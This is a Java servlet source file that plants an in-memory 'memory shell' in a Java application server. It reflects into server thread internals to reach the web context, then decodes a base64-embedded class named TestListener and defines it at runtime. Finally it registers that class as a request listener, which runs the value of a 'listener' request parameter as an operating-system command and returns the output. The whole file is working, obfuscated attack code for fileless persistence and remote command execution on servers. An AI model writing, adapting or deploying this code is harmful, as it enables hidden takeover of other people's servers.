package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.EventListener;

public class InjectListenerByServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Object context=getContext();
            // 名为TestListener，接收参数为listener
            String ListenerBase64 = "yv66vgAAADQAsQoAJABkCgBlAGYHAGcKACMAaAgAaQsAAwBqCgAjAGsLACEAbAoAbQBuBwBvCgBwAHEKAHAAcgoAcwB0BwB1CgAOAHYHAHcKABAAeAcAeQoAEgBkCgAQAHoHAHsKABUAZAoAFQB8CAB9CgAVAH4KABIAfwoAEgB+CgAkAIAIAIEKAIIAgwoAhACFCgCEAIYHAIcIAIgHAIkHAIoHAIsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADkxUZXN0TGlzdGVuZXI7AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQATc2VydmxldFJlcXVlc3RFdmVudAEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7AQAScmVxdWVzdEluaXRpYWxpemVkAQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAANjbWQBAA1TdGFja01hcFRhYmxlBwCJBwCMBwBnBwCHBwCNBwBvAQALQ29tbWFuZEV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADaXNyAQAbTGphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXI7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsHAI4HAI8HAJAHAHUHAHcHAHkBAApFeGNlcHRpb25zAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABHZhcjMBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEdmFyNAEABHZhcjUBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI2AQAEdmFyOAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHZhcjEBAAR2YXIyAQAKU291cmNlRmlsZQEAEVRlc3RMaXN0ZW5lci5qYXZhDAAmACcHAIwMAJEAkgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAFYAVwEACGxpc3RlbmVyDACTAEEMAEAAQQwAlACVBwCWDACXAJgBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwCODACZAJoMAJsAnAcAjwwAnQCeAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAJgCfAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAJgCgAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwAoQCiAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKMApAEAAQoMAKUAogwAowCmDACnAKgBAAhyZXNwb25zZQcAqQwAqgCrBwCsDACtAK4MAK8AsAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAHcmVxdWVzdAEADFRlc3RMaXN0ZW5lcgEAEGphdmEvbGFuZy9PYmplY3QBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1J1bnRpbWUBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAMZ2V0UGFyYW1ldGVyAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEA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";
            byte[] ListenerClass = new BASE64Decoder().decodeBuffer(ListenerBase64);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);

            Field f5 = context.getClass().getDeclaredField("classLoader");
            f5.setAccessible(true);
            Object o5 = f5.get(context);

            Class listener_class = (Class) defineClass.invoke(o5, ListenerClass, 0, ListenerClass.length);

            Field f6 = o5.getClass().getDeclaredField("cachedClasses");
            f6.setAccessible(true);
            Object o6 = f6.get(o5);

            Method m1 = o6.getClass().getDeclaredMethod("get", Object.class);
            m1.setAccessible(true);
            if (m1.invoke(o6, "TestListener") == null) {

                Method put = o6.getClass().getMethod("put", Object.class, Object.class);
                put.setAccessible(true);
                put.invoke(o6, "TestListener", listener_class);

                Field f7 = context.getClass().getDeclaredField("eventsManager");
                f7.setAccessible(true);
                Object o7 = f7.get(context);

                Method m2=o7.getClass().getDeclaredMethod("createListener",String.class);
                m2.setAccessible(true);
                Object l1=m2.invoke(o7,"TestListener");

                Method m3=o7.getClass().getDeclaredMethod("addEventListener", EventListener.class);
                m3.setAccessible(true);
                Object l2=m3.invoke(o7,l1);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static synchronized Object getContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field field=threadGroup.getClass().getDeclaredField("threads");
        field.setAccessible(true);
        Thread[] threads=(Thread[])field.get(threadGroup);
        for (Thread thread : threads) {
            if (thread.getName().contains("ACTIVE")) {
                Field f1 = thread.getClass().getDeclaredField("workEntry");
                f1.setAccessible(true);
                Object o1 = f1.get(thread);

                Field f2 = o1.getClass().getDeclaredField("connectionHandler");
                f2.setAccessible(true);
                Object o2 = f2.get(o1);

                Field f3 = o2.getClass().getDeclaredField("request");
                f3.setAccessible(true);
                Object o3 = f3.get(o2);

                Field f4 = o3.getClass().getDeclaredField("context");
                f4.setAccessible(true);
                Object o4 = f4.get(o3);
                return o4;
            }
        }
        return null;
    }




}
